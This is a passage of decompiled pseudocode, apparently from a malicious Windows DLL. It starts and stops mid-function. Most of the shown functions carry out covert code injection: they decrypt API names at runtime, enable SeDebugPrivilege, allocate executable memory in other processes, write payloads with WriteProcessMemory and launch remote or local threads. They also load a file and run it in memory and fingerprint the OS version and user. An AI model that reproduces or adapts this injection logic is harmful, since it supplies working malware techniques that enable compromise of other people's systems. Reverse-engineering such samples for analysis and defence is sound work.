  if ( GetUserNameA(Buffer, &pcbBuffer) && !lstrcmpiA(lpString1, Buffer) )
  {
    v1 = 1;
    v4 = 1;
  }
  return v1;
}

//----- (1000CF46) --------------------------------------------------------
char __cdecl sub_1000CF46(LPCSTR lpString2)
{
  FARPROC ProcAddress; // edi
  const CHAR *v3; // eax
  DWORD ModuleFileNameA; // eax
  const CHAR *CommandLineA; // eax
  int v6; // [esp+0h] [ebp-134h] BYREF
  CHAR Filename[264]; // [esp+Ch] [ebp-128h] BYREF
  char v8; // [esp+114h] [ebp-20h]
  DWORD v9; // [esp+118h] [ebp-1Ch]
  HMODULE hModule; // [esp+11Ch] [ebp-18h]
  FARPROC v11; // [esp+120h] [ebp-14h]
  int *v12; // [esp+124h] [ebp-10h]
  int v13; // [esp+130h] [ebp-4h]

  v12 = &v6;
  v8 = 0;
  memset(Filename, 0, 261);
  hModule = 0;
  ProcAddress = 0;
  v13 = 0;
  if ( !lpString2 )
    return 0;
  hModule = LoadLibraryA(dword_100160E4);
  if ( hModule )
  {
    v3 = (const CHAR *)sub_10008918((int)&unk_100150E4);
    ProcAddress = GetProcAddress(hModule, v3);
    v11 = ProcAddress;
  }
  ModuleFileNameA = GetModuleFileNameA(0, Filename, 0x105u);
  v9 = ModuleFileNameA;
  if ( !ModuleFileNameA || ModuleFileNameA == 261 )
  {
    CommandLineA = GetCommandLineA();
    if ( lstrcmpiA(CommandLineA, lpString2) )
LABEL_11:
      v8 = 1;
  }
  else if ( ProcAddress )
  {
    ((void (__stdcall *)(CHAR *))ProcAddress)(Filename);
    if ( !lstrcmpiA(Filename, lpString2) )
      goto LABEL_11;
  }
  v13 = -1;
  if ( hModule )
    FreeLibrary(hModule);
  return v8;
}

//----- (1000D041) --------------------------------------------------------
int __cdecl sub_1000D041(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // ecx
  unsigned int i; // eax
  bool v6; // zf
  _DWORD v8[4]; // [esp+0h] [ebp-28h] BYREF
  unsigned int v9; // [esp+10h] [ebp-18h]
  int v10; // [esp+14h] [ebp-14h]
  _DWORD *v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  v11 = v8;
  v10 = 0;
  v12 = 0;
  v4 = 0;
  v9 = 0;
  while ( v4 < a2 - a4 )
  {
    for ( i = 0; ; ++i )
    {
      v8[3] = i;
      v6 = i == a4;
      if ( i >= a4 )
        break;
      if ( *(_BYTE *)(i + v4 + a1) != *(_BYTE *)(i + a3) )
      {
        v6 = i == a4;
        break;
      }
    }
    if ( v6 )
      v10 = v4 + a1;
    v9 = ++v4;
  }
  return v10;
}

//----- (1000D0BF) --------------------------------------------------------
const CHAR *sub_1000D0BF()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100144E8);
  lpString1 = result;
  return result;
}

//----- (1000D0D5) --------------------------------------------------------
const CHAR *sub_1000D0D5()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10014388);
  dword_100160EC = result;
  return result;
}

//----- (1000D0E6) --------------------------------------------------------
_DWORD *__thiscall sub_1000D0E6(_DWORD *this)
{
  *(_BYTE *)this = 0;
  this[1] = 0;
  this[2] = 0;
  sub_1000D1F4((int)this);
  return this;
}

//----- (1000D0FC) --------------------------------------------------------
int __thiscall sub_1000D0FC(HANDLE *this)
{
  if ( this[1] )
    CloseHandle(this[1]);
  this[1] = 0;
  return sub_1000D1F4((int)this);
}

//----- (1000D11A) --------------------------------------------------------
char __thiscall sub_1000D11A(_BYTE *this)
{
  if ( *this != 1 )
  {
    if ( (sub_1000D3AF() & 0x20E) != 0 || !sub_1000D143((int)this) )
      return 0;
    *this = 1;
  }
  return 1;
}

//----- (1000D143) --------------------------------------------------------
char __thiscall sub_1000D143(int this)
{
  char v2; // bl
  HMODULE LibraryA; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  FARPROC ProcAddress; // eax
  bool v10; // zf

  v2 = 0;
  LibraryA = LoadLibraryA(dword_100160EC);
  *(_DWORD *)(this + 8) = LibraryA;
  if ( !LibraryA )
    goto LABEL_8;
  v4 = (const CHAR *)sub_10008918((int)&unk_100151C4);
  *(_DWORD *)(this + 12) = GetProcAddress(*(HMODULE *)(this + 8), v4);
  v5 = (const CHAR *)sub_10008918((int)&unk_10015198);
  *(_DWORD *)(this + 16) = GetProcAddress(*(HMODULE *)(this + 8), v5);
  v6 = (const CHAR *)sub_10008918((int)&unk_10015168);
  *(_DWORD *)(this + 20) = GetProcAddress(*(HMODULE *)(this + 8), v6);
  v7 = (const CHAR *)sub_10008918((int)&unk_10015138);
  *(_DWORD *)(this + 24) = GetProcAddress(*(HMODULE *)(this + 8), v7);
  v8 = (const CHAR *)sub_10008918((int)&unk_10015110);
  ProcAddress = GetProcAddress(*(HMODULE *)(this + 8), v8);
  v10 = *(_DWORD *)(this + 12) == 0;
  *(_DWORD *)(this + 28) = ProcAddress;
  if ( v10 )
    goto LABEL_8;
  if ( *(_DWORD *)(this + 16) && *(_DWORD *)(this + 20) && *(_DWORD *)(this + 24) && ProcAddress )
    return 1;
LABEL_8:
  sub_1000D1F4(this);
  return v2;
}

//----- (1000D1F4) --------------------------------------------------------
int __thiscall sub_1000D1F4(int this)
{
  int result; // eax

  result = *(_DWORD *)(this + 8);
  if ( result )
  {
    result = FreeLibrary(*(HMODULE *)(this + 8));
    *(_DWORD *)(this + 8) = 0;
  }
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  return result;
}

//----- (1000D21D) --------------------------------------------------------
char __thiscall sub_1000D21D(int this)
{
  bool v2; // zf
  HANDLE v3; // eax
  void *v4; // ebx
  DWORD dwProcessId; // [esp+Ch] [ebp-8h] BYREF
  char v7; // [esp+13h] [ebp-1h]

  v7 = 0;
  v2 = *(_BYTE *)this == 0;
  dwProcessId = 0;
  if ( !v2 && !sub_1000CA68(lpString1, &dwProcessId, 0) )
  {
    v3 = OpenProcess(0x400u, 0, dwProcessId);
    v4 = v3;
    if ( v3 )
    {
      if ( sub_1000D2A2((int (__stdcall **)(_DWORD, _DWORD, _DWORD))this, (int)v3, 5, (HANDLE *)(this + 4))
        || sub_1000D2A2((int (__stdcall **)(_DWORD, _DWORD, _DWORD))this, (int)v4, 4, (HANDLE *)(this + 4)) )
      {
        v7 = 1;
      }
      CloseHandle(v4);
    }
  }
  return v7;
}

//----- (1000D2A2) --------------------------------------------------------
char __thiscall sub_1000D2A2(int (__stdcall **this)(_DWORD, _DWORD, _DWORD), int a2, int a3, HANDLE *a4)
{
  int v4; // eax
  void *v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  if ( !a2 )
    return 0;
  if ( !a4 )
    return 0;
  v4 = a3;
  LOBYTE(v4) = a3 | 0xA;
  if ( !((int (__stdcall **)(int, int, void **))this)[3](a2, v4, &v6) )
    return 0;
  if ( *a4 )
    CloseHandle(*a4);
  *a4 = v6;
  return 1;
}

//----- (1000D2E9) --------------------------------------------------------
char __thiscall sub_1000D2E9(int (__stdcall **this)(_DWORD, _DWORD))
{
  char v2; // bl
  HKEY hKey; // [esp+8h] [ebp-4h] BYREF

  v2 = 0;
  hKey = 0;
  if ( !((int (__stdcall **)(int, HKEY *))this)[4](983103, &hKey) )
  {
    if ( ((int (__stdcall **)(int, HKEY))this)[5](-2147483647, hKey) )
    {
      RegCloseKey(hKey);
    }
    else
    {
      RegCloseKey(hKey);
      return 1;
    }
  }
  return v2;
}

//----- (1000D381) --------------------------------------------------------
bool sub_1000D381()
{
  int v1; // [esp+0h] [ebp-4h] BYREF

  v1 = 0;
  return !sub_1000CA68(lpString1, (DWORD *)&v1, 0) && v1 != 0;
}

//----- (1000D3AF) --------------------------------------------------------
int sub_1000D3AF()
{
  int result; // eax
  int v1; // eax
  int v2; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-ACh] BYREF
  CPPEH_RECORD ms_exc; // [esp+A0h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  result = dword_100160F0;
  if ( dword_100160F0 )
    goto LABEL_4;
  memset(&VersionInformation, 0, sizeof(VersionInformation));
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( !GetVersionExA(&VersionInformation) )
  {
    result = 2048;
    dword_100160F0 = 2048;
LABEL_4:
    ms_exc.registration.TryLevel = -1;
    return result;
  }
  switch ( VersionInformation.dwMajorVersion )
  {
    case 3u:
      v2 = (VersionInformation.dwMinorVersion != 51) - 1;
      LOWORD(v2) = v2 & 0xF810;
      v1 = v2 + 2048;
      goto LABEL_27;
    case 4u:
      if ( VersionInformation.dwMinorVersion )
      {
        if ( VersionInformation.dwMinorVersion == 10 )
          v1 = VersionInformation.szCSDVersion[1] != 65 ? 2 : 4;
        else
          v1 = VersionInformation.dwMinorVersion == 90 ? 8 : 2048;
      }
      else
      {
        if ( VersionInformation.dwPlatformId == 2 )
        {
          dword_100160F0 = 32;
          return dword_100160F0;
        }
        v1 = VersionInformation.dwPlatformId != 1 ? 2048 : 1;
      }
LABEL_27:
      dword_100160F0 = v1;
      return dword_100160F0;
    case 5u:
      switch ( VersionInformation.dwMinorVersion )
      {
        case 0u:
          dword_100160F0 = 64;
          return dword_100160F0;
        case 1u:
          dword_100160F0 = 128;
          return dword_100160F0;
        case 2u:
          dword_100160F0 = 256;
          return dword_100160F0;
      }
      goto LABEL_28;
  }
  if ( VersionInformation.dwMajorVersion != 6 )
    goto LABEL_28;
  if ( !VersionInformation.dwMinorVersion )
  {
    dword_100160F0 = 512;
    return dword_100160F0;
  }
  if ( VersionInformation.dwMinorVersion != 1 )
  {
LABEL_28:
    dword_100160F0 = 2048;
    return dword_100160F0;
  }
  dword_100160F0 = 1024;
  return dword_100160F0;
}
// 100160F0: using guessed type int dword_100160F0;

//----- (1000D567) --------------------------------------------------------
BOOL sub_1000D567()
{
  return (sub_1000D3AF() & 0x7F0) != 0;
}

//----- (1000D578) --------------------------------------------------------
unsigned int sub_1000D578()
{
  return ((unsigned int)sub_1000D3AF() >> 9) & 1;
}

//----- (1000D5C0) --------------------------------------------------------
int sub_1000D5C0()
{
  return 1;
}

//----- (1000D5C4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_1000D5C4@<al>(int a1@<ebp>)
{
  char result; // al

  result = 0;
  *(_DWORD *)(a1 - 4) = -1;
  return result;
}
// 1000D5DA: positive sp value C has been found
// 1000D5C4: could not find valid save-restore pair for ebx
// 1000D5C4: could not find valid save-restore pair for edi
// 1000D5C4: could not find valid save-restore pair for esi

//----- (1000D5DC) --------------------------------------------------------
CHAR *sub_1000D5DC()
{
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-ACh] BYREF
  CPPEH_RECORD ms_exc; // [esp+A0h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( byte_10016174 )
    return byte_100160F4;
  memset(&VersionInformation, 0, sizeof(VersionInformation));
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( !GetVersionExA(&VersionInformation) || !lstrcpynA(byte_100160F4, VersionInformation.szCSDVersion, 128) )
    return 0;
  byte_10016174 = 1;
  return byte_100160F4;
}
// 10016174: using guessed type char byte_10016174;

//----- (1000D691) --------------------------------------------------------
int __cdecl sub_1000D691(int a1, unsigned int a2, unsigned int *a3)
{
  unsigned int i; // esi
  int v5; // [esp+0h] [ebp-28h] BYREF
  int v6[2]; // [esp+Ch] [ebp-1Ch] BYREF
  int v7; // [esp+14h] [ebp-14h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v8 = &v5;
  v9 = 0;
  if ( a3 )
    *a3 = 0;
  for ( i = 0; ; ++i )
  {
    v6[1] = i;
    if ( i >= a2 )
    {
      v7 = 1;
      goto LABEL_9;
    }
    v6[0] = 0;
    if ( sub_1000CA68(*(LPCSTR *)(a1 + 4 * i), (DWORD *)v6, 0) != 1 )
      break;
  }
  if ( a3 )
    *a3 = i;
  v7 = 0;
  LOBYTE(v9) = 1;
LABEL_9:
  v9 = -1;
  return v7;
}

//----- (1000D710) --------------------------------------------------------
char sub_1000D710()
{
  const CHAR *v0; // eax
  DWORD LastError; // eax
  void (__stdcall *v2)(DWORD, DWORD, DWORD, const ULONG_PTR *); // edi
  const CHAR *v3; // eax
  DWORD v4; // eax
  const CHAR *v5; // eax
  DWORD v6; // eax
  const CHAR *v7; // eax
  DWORD v8; // eax
  const CHAR *v9; // eax
  DWORD v10; // eax
  const CHAR *v11; // eax
  DWORD v12; // eax
  const CHAR *v13; // eax
  DWORD v14; // eax
  const CHAR *v15; // eax
  DWORD v16; // eax
  const CHAR *v17; // eax
  DWORD v18; // eax
  HMODULE hModule; // [esp+Ch] [ebp-20h]

  v0 = (const CHAR *)sub_10008918((int)&unk_100152F8);
  hModule = GetModuleHandleA(v0);
  if ( hModule )
  {
    v2 = RaiseException;
  }
  else
  {
    LastError = GetLastError();
    v2 = RaiseException;
    RaiseException(LastError, 0, 0, 0);
  }
  v3 = (const CHAR *)sub_10008918((int)&unk_10014388);
  dword_10016178 = LoadLibraryA(v3);
  if ( !dword_10016178 )
  {
    v4 = GetLastError();
    v2(v4, 0, 0, 0);
  }
  v5 = (const CHAR *)sub_10008918((int)&unk_100152C8);
  dword_1001617C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(dword_10016178, v5);
  if ( !dword_1001617C )
  {
    v6 = GetLastError();
    v2(v6, 0, 0, 0);
  }
  v7 = (const CHAR *)sub_10008918((int)&unk_100151C4);
  dword_10016180 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(dword_10016178, v7);
  if ( !dword_10016180 )
  {
    v8 = GetLastError();
    v2(v8, 0, 0, 0);
  }
  v9 = (const CHAR *)sub_10008918((int)&unk_10015298);
  dword_10016184 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_10016178, v9);
  if ( !dword_10016184 )
  {
    v10 = GetLastError();
    v2(v10, 0, 0, 0);
  }
  v11 = (const CHAR *)sub_10008918((int)&unk_1001526C);
  dword_10016188 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                                hModule,
                                                                                                v11);
  if ( !dword_10016188 )
  {
    v12 = GetLastError();
    v2(v12, 0, 0, 0);
  }
  v13 = (const CHAR *)sub_10008918((int)&unk_10015244);
  dword_1001618C = (int)GetProcAddress(hModule, v13);
  if ( !dword_1001618C )
  {
    v14 = GetLastError();
    v2(v14, 0, 0, 0);
  }
  v15 = (const CHAR *)sub_10008918((int)&unk_1001521C);
  dword_10016190 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, v15);
  if ( !dword_10016190 )
  {
    v16 = GetLastError();
    v2(v16, 0, 0, 0);
  }
  v17 = (const CHAR *)sub_10008918((int)&unk_100151F4);
  dword_10016194 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, v17);
  if ( !dword_10016194 )
  {
    v18 = GetLastError();
    v2(v18, 0, 0, 0);
  }
  return 1;
}
// 1001617C: using guessed type int (__stdcall *dword_1001617C)(_DWORD, _DWORD, _DWORD);
// 10016180: using guessed type int (__stdcall *dword_10016180)(_DWORD, _DWORD, _DWORD);
// 10016184: using guessed type int (__stdcall *dword_10016184)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10016188: using guessed type int (__stdcall *dword_10016188)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1001618C: using guessed type int dword_1001618C;
// 10016190: using guessed type int (__stdcall *dword_10016190)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10016194: using guessed type int (__stdcall *dword_10016194)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000D8E9) --------------------------------------------------------
BOOL sub_1000D8E9()
{
  dword_1001617C = 0;
  dword_10016180 = 0;
  dword_10016184 = 0;
  return FreeLibrary(dword_10016178);
}
// 1001617C: using guessed type int dword_1001617C;
// 10016180: using guessed type int dword_10016180;
// 10016184: using guessed type int dword_10016184;

//----- (1000D956) --------------------------------------------------------
char sub_1000D956()
{
  DWORD LastError; // eax
  HANDLE CurrentProcess; // eax
  DWORD v2; // eax
  DWORD v3; // eax
  int v5[4]; // [esp+Ch] [ebp-38h] BYREF
  int v6[2]; // [esp+1Ch] [ebp-28h] BYREF
  HANDLE hObject; // [esp+24h] [ebp-20h] BYREF
  char v8; // [esp+28h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+2Ch] [ebp-18h]

  hObject = (HANDLE)-1;
  ms_exc.registration.TryLevel = 0;
  memset(v6, 0, sizeof(v6));
  if ( !dword_1001617C(0, aSedebugprivile, v6) )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  v5[0] = 1;
  v5[1] = v6[0];
  v5[2] = v6[1];
  v5[3] = 2;
  CurrentProcess = GetCurrentProcess();
  if ( !dword_10016180(CurrentProcess, 40, &hObject) )
  {
    v2 = GetLastError();
    RaiseException(v2, 0, 0, 0);
  }
  if ( !dword_10016184(hObject, 0, v5, 16, 0, 0) )
  {
    v3 = GetLastError();
    RaiseException(v3, 0, 0, 0);
  }
  v8 = 1;
  ms_exc.registration.TryLevel = -1;
  CloseHandle(hObject);
  return v8;
}
// 1001617C: invalid function type has been ignored
// 10016180: invalid function type has been ignored
// 10016184: invalid function type has been ignored
// 1001617C: using guessed type int (__stdcall *dword_1001617C)(_DWORD, _DWORD, _DWORD);
// 10016180: using guessed type int (__stdcall *dword_10016180)(_DWORD, _DWORD, _DWORD);
// 10016184: using guessed type int (__stdcall *dword_10016184)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000DA4F) --------------------------------------------------------
HANDLE __cdecl sub_1000DA4F(DWORD dwProcessId)
{
  return OpenProcess(0x43Au, 0, dwProcessId);
}

//----- (1000DAAA) --------------------------------------------------------
void *__cdecl sub_1000DAAA(HANDLE hProcess, LPCVOID lpBuffer, SIZE_T nSize)
{
  void *v3; // ebx
  DWORD LastError; // eax
  DWORD v5; // eax
  DWORD v6; // eax
  SIZE_T NumberOfBytesWritten[2]; // [esp+Ch] [ebp-20h] BYREF
  CPPEH_RECORD ms_exc; // [esp+14h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v3 = (void *)dword_10016190(hProcess, 0, nSize, 4096, 4);
  NumberOfBytesWritten[1] = (SIZE_T)v3;
  if ( !v3 )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  NumberOfBytesWritten[0] = 0;
  if ( !WriteProcessMemory(hProcess, v3, lpBuffer, nSize, NumberOfBytesWritten) )
  {
    v5 = GetLastError();
    RaiseException(v5, 0, 0, 0);
  }
  if ( NumberOfBytesWritten[0] != nSize )
  {
    v6 = GetLastError();
    RaiseException(v6, 0, 0, 0);
  }
  return v3;
}
// 10016190: using guessed type int (__stdcall *dword_10016190)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000DB61) --------------------------------------------------------
bool __cdecl sub_1000DB61(int a1, int a2)
{
  bool result; // al

  result = 0;
  if ( a2 )
    return dword_10016194(a1, a2, 0, 0x8000) != 0;
  return result;
}
// 10016194: using guessed type int (__stdcall *dword_10016194)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000DBC9) --------------------------------------------------------
BOOL __cdecl sub_1000DBC9(HANDLE hHandle)
{
  DWORD LastError; // eax
  DWORD v2; // eax
  DWORD ExitCode; // [esp+Ch] [ebp-20h] BYREF
  CPPEH_RECORD ms_exc; // [esp+14h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( WaitForSingleObject(hHandle, 0x7530u) )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  ExitCode = 0;
  if ( !GetExitCodeThread(hHandle, &ExitCode) )
  {
    v2 = GetLastError();
    RaiseException(v2, 0, 0, 0);
  }
  return ExitCode != 0;
}

//----- (1000DC63) --------------------------------------------------------
char __cdecl sub_1000DC63(DWORD dwProcessId, LPCSTR lpString)
{
  int v2; // eax
  DWORD (__stdcall *v3)(); // edi
  DWORD LastError; // eax
  void (__stdcall *v5)(DWORD, DWORD, DWORD, const ULONG_PTR *); // esi
  DWORD v6; // eax
  DWORD v7; // eax
  DWORD v8; // eax
  DWORD v9; // eax
  void *v11; // [esp+Ch] [ebp-30h]
  int v12; // [esp+10h] [ebp-2Ch]
  HANDLE hProcess; // [esp+14h] [ebp-28h]
  HANDLE hObject; // [esp+18h] [ebp-24h]

  v2 = lstrlenA(lpString);
  v12 = v2;
  if ( v2 <= 260 && v2 > 0 )
  {
    v5 = RaiseException;
    v3 = GetLastError;
  }
  else
  {
    v3 = GetLastError;
    LastError = GetLastError();
    v5 = RaiseException;
    RaiseException(LastError, 0, 0, 0);
  }
  sub_1000D956();
  hProcess = sub_1000DA4F(dwProcessId);
  if ( !hProcess )
  {
    v6 = v3();
    v5(v6, 0, 0, 0);
  }
  v11 = sub_1000DAAA(hProcess, lpString, v12 + 1);
  if ( !v11 )
  {
    v7 = v3();
    v5(v7, 0, 0, 0);
  }
  hObject = (HANDLE)dword_10016188(hProcess, 0, 0, dword_1001618C, v11, 0, 0);
  if ( !hObject )
  {
    v8 = v3();
    v5(v8, 0, 0, 0);
  }
  if ( !sub_1000DBC9(hObject) )
  {
    v9 = v3();
    v5(v9, 0, 0, 0);
  }
  sub_1000DB61((int)hProcess, (int)v11);
  CloseHandle(hObject);
  CloseHandle(0);
  return 1;
}
// 10016188: using guessed type int (__stdcall *dword_10016188)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1001618C: using guessed type int dword_1001618C;

//----- (1000DD86) --------------------------------------------------------
char __cdecl sub_1000DD86(DWORD dwProcessId, LPCVOID lpBuffer, SIZE_T nSize, LPCVOID a4, SIZE_T a5)
{
  char *v5; // esi
  HANDLE v6; // eax
  void *v7; // eax
  SIZE_T NumberOfBytesWritten[2]; // [esp+Ch] [ebp-48h] BYREF
  DWORD flOldProtect[2]; // [esp+14h] [ebp-40h] BYREF
  char *v12; // [esp+20h] [ebp-34h]
  char v13[4]; // [esp+24h] [ebp-30h] BYREF
  char *v14; // [esp+28h] [ebp-2Ch]
  char v15; // [esp+2Ch] [ebp-28h]
  HANDLE hProcess; // [esp+30h] [ebp-24h]
  HANDLE hObject; // [esp+34h] [ebp-20h]
  char v18; // [esp+38h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+3Ch] [ebp-18h]

  v18 = 0;
  v5 = 0;
  hObject = (HANDLE)-1;
  v14 = 0;
  v15 = 1;
  ms_exc.registration.TryLevel = 1;
  v6 = sub_1000DA4F(dwProcessId);
  hProcess = v6;
  if ( v6 )
  {
    flOldProtect[1] = nSize + a5;
    v5 = (char *)dword_10016190(v6, 0, nSize + a5, 4096, 64);
    v14 = v5;
    if ( v5 )
    {
      flOldProtect[0] = 0;
      if ( VirtualProtectEx(hProcess, v5, nSize + a5, 0x40u, flOldProtect) )
      {
        NumberOfBytesWritten[0] = 0;
        NumberOfBytesWritten[1] = (SIZE_T)v5;
        if ( WriteProcessMemory(hProcess, v5, lpBuffer, nSize, NumberOfBytesWritten) )
        {
          v12 = &v5[nSize];
          if ( WriteProcessMemory(hProcess, &v5[nSize], a4, a5, NumberOfBytesWritten) )
          {
            v7 = (void *)dword_10016188(hProcess, 0, 0, &v5[nSize], v5, 0, v13);
            hObject = v7;
            if ( v7 != (void *)-1 )
            {
              if ( WaitForSingleObject(v7, 0x7530u) )
                v15 = 0;
              else
                v18 = 1;
            }
          }
        }
      }
    }
  }
  ms_exc.registration.TryLevel = 0;
  if ( v15 == 1 )
    sub_1000DB61((int)hProcess, (int)v5);
  CloseHandle(hObject);
  CloseHandle(hProcess);
  return v18;
}
// 10016188: using guessed type int (__stdcall *dword_10016188)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10016190: using guessed type int (__stdcall *dword_10016190)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000DD86: using guessed type char var_30[4];

//----- (1000DEE0) --------------------------------------------------------
char __cdecl sub_1000DEE0(LPCSTR lpFileName, DWORD dwProcessId, int (__stdcall *a3)())
{
  FARPROC *v3; // edi
  HANDLE FileA; // eax
  DWORD FileSize; // esi
  FARPROC *v6; // eax
  SIZE_T v8; // [esp-4h] [ebp-48h]
  SIZE_T nSize; // [esp+14h] [ebp-30h]
  DWORD NumberOfBytesRead; // [esp+1Ch] [ebp-28h] BYREF
  HANDLE hFile; // [esp+20h] [ebp-24h]
  char v12; // [esp+24h] [ebp-20h]
  FARPROC *v13; // [esp+28h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+2Ch] [ebp-18h]

  v3 = 0;
  v13 = 0;
  v12 = 0;
  ms_exc.registration.TryLevel = 1;
  FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
  hFile = FileA;
  if ( FileA != (HANDLE)-1 )
  {
    FileSize = GetFileSize(FileA, 0);
    if ( FileSize != -1 )
    {
      nSize = FileSize + 24;
      v6 = (FARPROC *)malloc(FileSize + 24);
      v3 = v6;
      v13 = v6;
      if ( v6 )
      {
        if ( sub_1000E19F(v6, a3) )
        {
          NumberOfBytesRead = 0;
          if ( ReadFile(hFile, v3 + 6, FileSize, &NumberOfBytesRead, 0) )
          {
            v8 = (char *)nullsub_1 - (char *)sub_1000E21E;
            if ( dwProcessId )
              sub_1000DD86(dwProcessId, v3, nSize, sub_1000E21E, v8);
            else
              sub_1000E002(v3, nSize, sub_1000E21E, v8);
            v12 = 1;
          }
        }
      }
    }
  }
  ms_exc.registration.TryLevel = 0;
  CloseHandle(hFile);
  free(v3);
  return v12;
}
// 1000E4A9: using guessed type int nullsub_1();

//----- (1000E002) --------------------------------------------------------
char __cdecl sub_1000E002(void *Src, size_t Size, void *a3, size_t a4)
{
  char *v4; // esi
  HANDLE Thread; // eax
  DWORD flOldProtect; // [esp+10h] [ebp-3Ch] BYREF
  SIZE_T dwSize; // [esp+14h] [ebp-38h]
  char *v10; // [esp+1Ch] [ebp-30h]
  DWORD ThreadId[2]; // [esp+20h] [ebp-2Ch] BYREF
  char v12; // [esp+28h] [ebp-24h]
  HANDLE hObject; // [esp+2Ch] [ebp-20h]
  char v14; // [esp+30h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  v14 = 0;
  hObject = (HANDLE)-1;
  v12 = 1;
  ms_exc.registration.TryLevel = 1;
  dwSize = Size + a4;
  v4 = (char *)VirtualAlloc(0, Size + a4, 0x1000u, 0x40u);
  ThreadId[1] = (DWORD)v4;
  if ( v4 )
  {
    flOldProtect = 0;
    if ( VirtualProtect(v4, dwSize, 0x40u, &flOldProtect) )
    {
      memcpy(v4, Src, Size);
      v10 = &v4[Size];
      memcpy(&v4[Size], a3, a4);
      Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&v4[Size], v4, 0, ThreadId);
      hObject = Thread;
      if ( Thread != (HANDLE)-1 )
      {
        if ( WaitForSingleObject(Thread, 0x7530u) )
          v12 = 0;
        else
          v14 = 1;
      }
    }
  }
  ms_exc.registration.TryLevel = 0;
  if ( v12 == 1 )
    VirtualFree(v4, 0, 0x8000u);
  CloseHandle(hObject);
  return v14;
}

//----- (1000E120) --------------------------------------------------------
int sub_1000E120()
{
  int result; // eax

  result = sub_10008918((int)&unk_10015010);
  dword_100161A0 = result;
  return result;
}
// 100161A0: using guessed type int dword_100161A0;

//----- (1000E136) --------------------------------------------------------
const CHAR *sub_1000E136()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10015334);
  lpProcName = result;
  return result;
}

//----- (1000E14C) --------------------------------------------------------
const CHAR *sub_1000E14C()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_1001535C);
  dword_100161A8 = result;
  return result;
}

//----- (1000E162) --------------------------------------------------------
const CHAR *sub_1000E162()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10015380);
  dword_100161AC = result;
  return result;
}

//----- (1000E178) --------------------------------------------------------
const CHAR *sub_1000E178()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10015244);
  dword_10016198 = result;
  return result;
}

//----- (1000E18E) --------------------------------------------------------
const CHAR *sub_1000E18E()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100153A8);
  dword_1001619C = result;
  return result;
}

//----- (1000E19F) --------------------------------------------------------
char __cdecl sub_1000E19F(FARPROC *a1, int (__stdcall *a2)())
{
  HMODULE ModuleHandleA; // ebx
  FARPROC ProcAddress; // eax

  ModuleHandleA = GetModuleHandleA(ModuleName);
  *a1 = GetProcAddress(ModuleHandleA, lpProcName);
  a1[1] = GetProcAddress(ModuleHandleA, dword_100161A8);
  a1[2] = GetProcAddress(ModuleHandleA, dword_100161AC);
  a1[3] = GetProcAddress(ModuleHandleA, dword_10016198);
  ProcAddress = GetProcAddress(ModuleHandleA, dword_1001619C);
  a1[4] = ProcAddress;
  if ( !*a1 || !a1[1] || !a1[2] || !a1[3] || !ProcAddress )
    return 0;
  a1[5] = a2;
  return 1;
}

//----- (1000E21E) --------------------------------------------------------
